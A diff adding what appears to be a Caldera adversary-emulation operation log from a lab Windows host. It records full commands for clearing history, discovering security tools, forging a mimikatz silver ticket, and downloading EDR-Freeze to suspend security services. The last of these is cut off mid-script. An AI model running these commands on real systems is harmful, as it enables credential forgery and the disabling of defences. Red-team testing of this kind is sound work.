@@ -1,0 +1,3407 @@
+{
+  "op_id": "ca25eccc-1615-463f-92e7-c885e9915d59",
+  "operation": {
+    "id": "ca25eccc-1615-463f-92e7-c885e9915d59",
+    "name": "apt-sim-20260401-154524",
+    "host_group": [
+      {
+        "paw": "fgdafj",
+        "sleep_min": 30,
+        "sleep_max": 60,
+        "watchdog": 0,
+        "group": "red",
+        "architecture": "amd64",
+        "platform": "windows",
+        "server": "http://192.168.30.45:8888",
+        "upstream_dest": "http://192.168.30.45:8888",
+        "username": "WS10\\Administrator",
+        "location": "C:\\Users\\Public\\splunkd.exe",
+        "pid": 6676,
+        "ppid": 8956,
+        "trusted": true,
+        "executors": [
+          "cmd",
+          "psh",
+          "proc"
+        ],
+        "privilege": "Elevated",
+        "exe_name": "splunkd.exe",
+        "host": "WS10",
+        "contact": "HTTP",
+        "proxy_receivers": {},
+        "proxy_chain": [],
+        "origin_link_id": "",
+        "deadman_enabled": true,
+        "available_contacts": [
+          "HTTP"
+        ],
+        "host_ip_addrs": [
+          "192.168.30.24"
+        ],
+        "display_name": "WS10$WS10\\Administrator",
+        "created": "2026-04-01T13:44:55Z",
+        "last_seen": "2026-04-01T13:55:14Z",
+        "links": [
+          {
+            "id": "2804c127-3d46-4aa8-bbc6-48418fbd114b",
+            "paw": "fgdafj",
+            "command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+            "plaintext_command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+            "status": 0,
+            "score": 0,
+            "jitter": 0,
+            "decide": "2026-04-01T13:44:55Z",
+            "pin": 0,
+            "pid": "9040",
+            "facts": [],
+            "relationships": [],
+            "used": [],
+            "unique": "2804c127-3d46-4aa8-bbc6-48418fbd114b",
+            "collect": "2026-04-01T13:44:55Z",
+            "finish": "2026-04-01T13:44:55Z",
+            "ability": {
+              "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+              "tactic": "defense-evasion",
+              "technique_name": "Indicator Removal on Host: Clear Command History",
+              "technique_id": "T1070.003",
+              "name": "Avoid logs",
+              "description": "Stop terminal from logging history",
+              "executors": [
+                {
+                  "name": "sh",
+                  "platform": "darwin",
+                  "command": "> $HOME/.bash_history && unset HISTFILE",
+                  "code": null,
+                  "language": null,
+                  "build_target": null,
+                  "payloads": [],
+                  "uploads": [],
+                  "timeout": 60,
+                  "parsers": [],
+                  "cleanup": [],
+                  "variations": [],
+                  "additional_info": {}
+                },
+                {
+                  "name": "sh",
+                  "platform": "linux",
+                  "command": "> $HOME/.bash_history && unset HISTFILE",
+                  "code": null,
+                  "language": null,
+                  "build_target": null,
+                  "payloads": [],
+                  "uploads": [],
+                  "timeout": 60,
+                  "parsers": [],
+                  "cleanup": [],
+                  "variations": [],
+                  "additional_info": {}
+                },
+                {
+                  "name": "psh",
+                  "platform": "windows",
+                  "command": "Clear-History;Clear",
+                  "code": null,
+                  "language": null,
+                  "build_target": null,
+                  "payloads": [],
+                  "uploads": [],
+                  "timeout": 60,
+                  "parsers": [],
+                  "cleanup": [],
+                  "variations": [],
+                  "additional_info": {}
+                }
+              ],
+              "requirements": [],
+              "privilege": null,
+              "repeatable": false,
+              "buckets": [
+                "defense-evasion"
+              ],
+              "additional_info": {},
+              "access": {},
+              "singleton": false,
+              "plugin": "stockpile",
+              "delete_payload": true
+            },
+            "executor": {
+              "name": "psh",
+              "platform": "windows",
+              "command": "Clear-History;Clear",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            },
+            "cleanup": 0,
+            "visibility": {
+              "score": 50,
+              "adjustments": []
+            },
+            "host": "WS10",
+            "output": "False",
+            "deadman": false,
+            "agent_reported_time": "2026-04-01T13:44:56Z"
+          }
+        ],
+        "pending_contact": "HTTP",
+        "status": "alive"
+      }
+    ],
+    "adversary": {
+      "adversary_id": "temp-seed-fgdafj-1775051124",
+      "name": "Temp Seed Windows - Everything Bagel",
+      "description": "Auto-generated seed adversary from 785baa02-df5d-450a-ab3a-1a863f22b4b0 for agent fgdafj",
+      "atomic_ordering": [
+        "05cda6f6-2b1b-462e-bff1-845af94343f7",
+        "44beec43a3cfb4e7bb1b976e64a09da9",
+        "8bdb353bbee5378745783ff6f2d49cb0",
+        "54ebf8b23105d20c98156afd96b97c81",
+        "feaced8f-f43f-452a-9500-a5219488abb8",
+        "1ddf2b8ee6a56ce9f9132a168947653e",
+        "13a0c78dbd8d3645db69540bfe7cd038",
+        "7d0acfc367ef432554f480d6e8c22c7c"
+      ],
+      "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+      "tags": [],
+      "has_repeatable_abilities": false,
+      "plugin": ""
+    },
+    "jitter": "2/8",
+    "planner": {
+      "id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a",
+      "name": "atomic",
+      "module": "app.planners.atomic",
+      "params": {},
+      "description": "During each phase of the operation, the atomic planner iterates through each agent and sends the next\navailable ability it thinks that agent can complete. This decision is based on the agent matching the operating\nsystem (execution platform) of the ability and the ability command having no unsatisfied variables.\nThe planner then waits for each agent to complete its command before determining the subsequent abilities.\nThe abilities are processed in the order set by each agent's atomic ordering.\nFor instance, if agent A has atomic ordering (A1, A2, A3) and agent B has atomic ordering (B1, B2, B3), then\nthe planner would send (A1, B1) in the first phase, then (A2, B2), etc.\n",
+      "stopping_conditions": [],
+      "ignore_enforcement_modules": [],
+      "allow_repeatable_abilities": false,
+      "plugin": ""
+    },
+    "start": "2026-04-01T13:45:25Z",
+    "state": "finished",
+    "obfuscator": "plain-text",
+    "autonomous": 1,
+    "chain": [
+      {
+        "id": "2fd9c3c9-fa14-4076-afd0-42c7b64a8fb6",
+        "paw": "fgdafj",
+        "command": "$owners = @{};gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };$valid | ConvertTo-Json",
+        "plaintext_command": "$owners = @{};gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };$valid | ConvertTo-Json",
+        "status": 0,
+        "score": 0,
+        "decide": "2026-04-01T13:45:26Z",
+        "pin": 0,
+        "pid": "2388",
+        "facts": [
+          {
+            "unique": "host.process.id1036",
+            "trait": "host.process.id",
+            "name": "host.process.id",
+            "value": 1036,
+            "created": "2026-04-01T13:45:40Z",
+            "score": 1,
+            "source": "ca25eccc-1615-463f-92e7-c885e9915d59",
+            "origin_type": "LEARNED",
+            "links": [
+              "2fd9c3c9-fa14-4076-afd0-42c7b64a8fb6"
+            ],
+            "relationships": [
+              "host.process.id(1036)"
+            ],
+            "limit_count": -1,
+            "collected_by": [
+              "fgdafj"
+            ],
+            "technique_id": "T1057"
+          },
+          {
+            "unique": "host.process.id1836",
+            "trait": "host.process.id",
+            "name": "host.process.id",
+            "value": 1836,
+            "created": "2026-04-01T13:45:40Z",
+            "score": 1,
+            "source": "ca25eccc-1615-463f-92e7-c885e9915d59",
+            "origin_type": "LEARNED",
+            "links": [
+              "2fd9c3c9-fa14-4076-afd0-42c7b64a8fb6"
+            ],
+            "relationships": [
+              "host.process.id(1836)"
+            ],
+            "limit_count": -1,
+            "collected_by": [
+              "fgdafj"
+            ],
+            "technique_id": "T1057"
+          },
+          {
+            "unique": "host.process.id6328",
+            "trait": "host.process.id",
+            "name": "host.process.id",
+            "value": 6328,
+            "created": "2026-04-01T13:45:40Z",
+            "score": 1,
+            "source": "ca25eccc-1615-463f-92e7-c885e9915d59",
+            "origin_type": "LEARNED",
+            "links": [
+              "2fd9c3c9-fa14-4076-afd0-42c7b64a8fb6"
+            ],
+            "relationships": [
+              "host.process.id(6328)"
+            ],
+            "limit_count": -1,
+            "collected_by": [
+              "fgdafj"
+            ],
+            "technique_id": "T1057"
+          }
+        ],
+        "relationships": [],
+        "used": [],
+        "unique": "2fd9c3c9-fa14-4076-afd0-42c7b64a8fb6",
+        "collect": "2026-04-01T13:45:37Z",
+        "finish": "2026-04-01T13:45:40Z",
+        "ability": {
+          "ability_id": "05cda6f6-2b1b-462e-bff1-845af94343f7",
+          "tactic": "discovery",
+          "technique_name": "Process Discovery",
+          "technique_id": "T1057",
+          "name": "Discover injectable process",
+          "description": "Discovers processes that the current user has the ability to access and selects an injectable one",
+          "executors": [
+            {
+              "name": "psh",
+              "platform": "windows",
+              "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [
+                {
+                  "module": "plugins.stockpile.app.parsers.json",
+                  "parserconfigs": [
+                    {
+                      "source": "host.process.id",
+                      "edge": "",
+                      "target": "",
+                      "custom_parser_vals": {
+                        "json_key": "Id",
+                        "json_type": "int"
+                      }
+                    }
+                  ]
+                }
+              ],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            }
+          ],
+          "requirements": [],
+          "privilege": null,
+          "repeatable": false,
+          "buckets": [
+            "discovery"
+          ],
+          "additional_info": {},
+          "access": {},
+          "singleton": false,
+          "plugin": "stockpile",
+          "delete_payload": true
+        },
+        "executor": {
+          "name": "psh",
+          "platform": "windows",
+          "command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\n$valid = foreach($p in $ps) { if($p.Owner -eq $env:USERNAME -And $p.ProcessName -eq \"svchost\") {$p} };\n$valid | ConvertTo-Json",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [
+            {
+              "module": "plugins.stockpile.app.parsers.json",
+              "parserconfigs": [
+                {
+                  "source": "host.process.id",
+                  "edge": "",
+                  "target": "",
+                  "custom_parser_vals": {
+                    "json_key": "Id",
+                    "json_type": "int"
+                  }
+                }
+              ]
+            }
+          ],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        },
+        "cleanup": 0,
+        "visibility": {
+          "score": 50,
+          "adjustments": []
+        },
+        "host": "WS10",
+        "output": "True",
+        "deadman": false,
+        "agent_reported_time": "2026-04-01T13:45:38Z"
+      },
+      {
+        "id": "c0247be8-17a5-428a-a42c-08ed6bb23967",
+        "paw": "fgdafj",
+        "command": "netsh.exe advfirewall  show allprofiles  && netsh.exe advfirewall firewall dump && netsh.exe advfirewall show currentprofile && netsh.exe advfirewall firewall show rule name=all && netsh.exe firewall show state && netsh.exe firewall show config && sc query windefend && powershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\" && powershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\" && powershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\" && tasklist.exe && tasklist.exe | findstr /i virus && tasklist.exe | findstr /i cb && tasklist.exe | findstr /i defender && tasklist.exe | findstr /i cylance && tasklist.exe | findstr /i mc && tasklist.exe | findstr /i \"virus cb defender cylance mc\"",
+        "plaintext_command": "netsh.exe advfirewall  show allprofiles  && netsh.exe advfirewall firewall dump && netsh.exe advfirewall show currentprofile && netsh.exe advfirewall firewall show rule name=all && netsh.exe firewall show state && netsh.exe firewall show config && sc query windefend && powershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\" && powershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\" && powershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\" && tasklist.exe && tasklist.exe | findstr /i virus && tasklist.exe | findstr /i cb && tasklist.exe | findstr /i defender && tasklist.exe | findstr /i cylance && tasklist.exe | findstr /i mc && tasklist.exe | findstr /i \"virus cb defender cylance mc\"",
+        "status": 1,
+        "score": 0,
+        "decide": "2026-04-01T13:45:42Z",
+        "pin": 0,
+        "pid": "3000",
+        "facts": [],
+        "relationships": [],
+        "used": [],
+        "unique": "c0247be8-17a5-428a-a42c-08ed6bb23967",
+        "collect": "2026-04-01T13:46:34Z",
+        "finish": "2026-04-01T13:46:42Z",
+        "ability": {
+          "ability_id": "44beec43a3cfb4e7bb1b976e64a09da9",
+          "tactic": "discovery",
+          "technique_name": "Software Discovery: Security Software Discovery",
+          "technique_id": "T1518.001",
+          "name": "Security Software Discovery",
+          "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, the test is going to display running processes, firewall configuration on network profiles\nand specific security software.\n",
+          "executors": [
+            {
+              "name": "cmd",
+              "platform": "windows",
+              "command": "netsh.exe advfirewall  show allprofiles  && netsh.exe advfirewall firewall dump && netsh.exe advfirewall show currentprofile && netsh.exe advfirewall firewall show rule name=all && netsh.exe firewall show state && netsh.exe firewall show config && sc query windefend && powershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\" && powershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\" && powershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\" && tasklist.exe && tasklist.exe | findstr /i virus && tasklist.exe | findstr /i cb && tasklist.exe | findstr /i defender && tasklist.exe | findstr /i cylance && tasklist.exe | findstr /i mc && tasklist.exe | findstr /i \"virus cb defender cylance mc\"",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            }
+          ],
+          "requirements": [],
+          "privilege": null,
+          "repeatable": false,
+          "buckets": [
+            "discovery"
+          ],
+          "additional_info": {},
+          "access": {},
+          "singleton": false,
+          "plugin": "atomic",
+          "delete_payload": true
+        },
+        "executor": {
+          "name": "cmd",
+          "platform": "windows",
+          "command": "netsh.exe advfirewall  show allprofiles  && netsh.exe advfirewall firewall dump && netsh.exe advfirewall show currentprofile && netsh.exe advfirewall firewall show rule name=all && netsh.exe firewall show state && netsh.exe firewall show config && sc query windefend && powershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\" && powershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\" && powershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\" && tasklist.exe && tasklist.exe | findstr /i virus && tasklist.exe | findstr /i cb && tasklist.exe | findstr /i defender && tasklist.exe | findstr /i cylance && tasklist.exe | findstr /i mc && tasklist.exe | findstr /i \"virus cb defender cylance mc\"",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        },
+        "cleanup": 0,
+        "visibility": {
+          "score": 50,
+          "adjustments": []
+        },
+        "host": "WS10",
+        "output": "True",
+        "deadman": false,
+        "agent_reported_time": "2026-04-01T13:46:35Z"
+      },
+      {
+        "id": "5a721850-4e1e-426c-847c-d896af2018a3",
+        "paw": "fgdafj",
+        "command": "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore; $domain_sid = \"S-1-5-21-DEFAULT\"; If ($domain_sid -Match \"DEFAULT\") {;   $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;   $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')); }; @\"; >%TEMP%\\silver.txt 2>&1 (;   echo Purge existing tickets and create silver ticket:;   klist purge;   PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\\\=%.%userdnsdomain% /ptt\" \"exit\";   echo.;   echo executing:schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   ;   echo.;   echo Tickets after requesting schtasks:;   klist;   echo.;   echo End of Silver Ticket attack; ); \"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Silver Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\silver.txt; Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore",
+        "plaintext_command": "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore; $domain_sid = \"S-1-5-21-DEFAULT\"; If ($domain_sid -Match \"DEFAULT\") {;   $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;   $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')); }; @\"; >%TEMP%\\silver.txt 2>&1 (;   echo Purge existing tickets and create silver ticket:;   klist purge;   PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\\\=%.%userdnsdomain% /ptt\" \"exit\";   echo.;   echo executing:schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   ;   echo.;   echo Tickets after requesting schtasks:;   klist;   echo.;   echo End of Silver Ticket attack; ); \"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Silver Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\silver.txt; Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore",
+        "status": 1,
+        "score": 0,
+        "decide": "2026-04-01T13:46:47Z",
+        "pin": 0,
+        "pid": "8236",
+        "facts": [],
+        "relationships": [],
+        "used": [],
+        "unique": "5a721850-4e1e-426c-847c-d896af2018a3",
+        "collect": "2026-04-01T13:47:23Z",
+        "finish": "2026-04-01T13:47:24Z",
+        "ability": {
+          "ability_id": "8bdb353bbee5378745783ff6f2d49cb0",
+          "tactic": "credential-access",
+          "technique_name": "Steal or Forge Kerberos Tickets: Silver Ticket",
+          "technique_id": "T1558.002",
+          "name": "Crafting Active Directory silver tickets with mimikatz",
+          "description": "Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
+          "executors": [
+            {
+              "name": "psh",
+              "platform": "windows",
+              "command": "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore; $domain_sid = \"S-1-5-21-DEFAULT\"; If ($domain_sid -Match \"DEFAULT\") {;   $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;   $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')); }; @\"; >%TEMP%\\silver.txt 2>&1 (;   echo Purge existing tickets and create silver ticket:;   klist purge;   PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\\\=%.%userdnsdomain% /ptt\" \"exit\";   echo.;   echo executing:schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   ;   echo.;   echo Tickets after requesting schtasks:;   klist;   echo.;   echo End of Silver Ticket attack; ); \"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Silver Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\silver.txt; Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [
+                {
+                  "module": "plugins.atomic.app.parsers.atomic_powershell",
+                  "parserconfigs": [
+                    {
+                      "source": "validate_me",
+                      "edge": "",
+                      "target": "",
+                      "custom_parser_vals": {}
+                    }
+                  ]
+                }
+              ],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            }
+          ],
+          "requirements": [],
+          "privilege": null,
+          "repeatable": false,
+          "buckets": [
+            "credential-access"
+          ],
+          "additional_info": {},
+          "access": {},
+          "singleton": false,
+          "plugin": "atomic",
+          "delete_payload": true
+        },
+        "executor": {
+          "name": "psh",
+          "platform": "windows",
+          "command": "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore; $domain_sid = \"S-1-5-21-DEFAULT\"; If ($domain_sid -Match \"DEFAULT\") {;   $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;   $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')); }; @\"; >%TEMP%\\silver.txt 2>&1 (;   echo Purge existing tickets and create silver ticket:;   klist purge;   PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\\\=%.%userdnsdomain% /ptt\" \"exit\";   echo.;   echo executing:schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   ;   echo.;   echo Tickets after requesting schtasks:;   klist;   echo.;   echo End of Silver Ticket attack; ); \"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Silver Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\silver.txt; Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [
+            {
+              "module": "plugins.atomic.app.parsers.atomic_powershell",
+              "parserconfigs": [
+                {
+                  "source": "validate_me",
+                  "edge": "",
+                  "target": "",
+                  "custom_parser_vals": {}
+                }
+              ]
+            }
+          ],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        },
+        "cleanup": 0,
+        "visibility": {
+          "score": 50,
+          "adjustments": []
+        },
+        "host": "WS10",
+        "output": "True",
+        "deadman": false,
+        "agent_reported_time": "2026-04-01T13:47:24Z"
+      },
+      {
+        "id": "0d02e948-0045-4a9b-a2e0-b8e17a007065",
+        "paw": "fgdafj",
+        "command": "Add-Type -TypeDefinition @\"; using System; using System.Runtime.InteropServices; public class TokenAdjuster {;     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);     [DllImport(\"advapi32.dll\", SetLastError = true)];     public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,;         ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);     [StructLayout(LayoutKind.Sequential, Pack = 1)];     public struct TOKEN_PRIVILEGES {;         public int PrivilegeCount;         public long Luid;         public int Attributes;     };     public const int SE_PRIVILEGE_ENABLED = 0x00000002;     public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;     public const uint TOKEN_QUERY = 0x0008;     public static bool EnableSeDebugPrivilege() {;         IntPtr hToken;         if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken));             return false;         long luid;         if (!LookupPrivilegeValue(null, \"SeDebugPrivilege\", out luid));             return false;         TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();         tp.PrivilegeCount = 1;         tp.Luid = luid;         tp.Attributes = SE_PRIVILEGE_ENABLED;         return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);     }; }; \"@; $result = [TokenAdjuster]::EnableSeDebugPrivilege(); if ($result) {;     Write-Host \"SeDebugPrivilege enabled successfully.\" -ForegroundColor Green; } else {;     Write-Host \"Failed to enable SeDebugPrivilege.\" -ForegroundColor Red;     exit 1; }; $process = Get-Process -Name $SecurityHealthService -ErrorAction Stop; $processName = $process.ProcessName; Write-Host \"Process Name: $processName)\"; Write-Host \"PID: $($process.Id)\";         ; $query = \"SELECT * FROM Win32_Process WHERE Name = '$processName.exe'\"; $wmiProcess = Get-WmiObject -Query $query; $owner = $wmiProcess.GetOwner();     Write-Host \"User: $($owner.Domain)\\$($owner.User)\"; $scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition; $downloadUrl = \"https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip\"; $zipPath = Join-Path $scriptFolder \"EDR-Freeze_1.0.zip\"; Write-Host \"Downloading latest EDR-Freeze from $downloadUrl\" -ForegroundColor Cyan; try {;     Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop;     Write-Host \"Download completed: $zipPath\" -ForegroundColor Green;     $extractFolder = $scriptFolder;     if (Test-Path $zipPath) {;         Write-Host \"Extracting archive to $extractFolder (overwriting existing files)\" -ForegroundColor Cyan;         if (Test-Path $extractFolder) {;             Get-Process -Name \"EDR-Freeze_1.0\" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue;         };         Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null;         $archive = $null;         try {;             $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath);             foreach ($entry in $archive.Entries) {;                 if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue };                 if ($entry.FullName.EndsWith('/')) {;                     $dirPath = Join-Path $extractFolder $entry.FullName;                     if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null };                     continue;                 };                 $destPath = Join-Path $extractFolder $entry.FullName;                 $destDir = Split-Path $destPath -Parent;                 if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null };                 if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue };                 try {;                     [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false);                 } catch {;                     Write-Host \"Failed to extract entry $($entry.FullName): $_\" -ForegroundColor Yellow;                 };             };             Write-Host \"Extraction completed.\" -ForegroundColor Green;         } finally {;             if ($archive) { $archive.Dispose() };         };     }; } catch {;     Write-Host \"Failed to download or extract EDR-Freeze: $_\" -ForegroundColor Red; }; Write-Host \"Waiting 15s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 10s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 5; Write-Host \"Waiting 5s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 3; Write-Host \"Waiting 2s before putting $processName in the comma\" -ForegroundColor Yellow; Start-Sleep -Seconds 2; $edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' 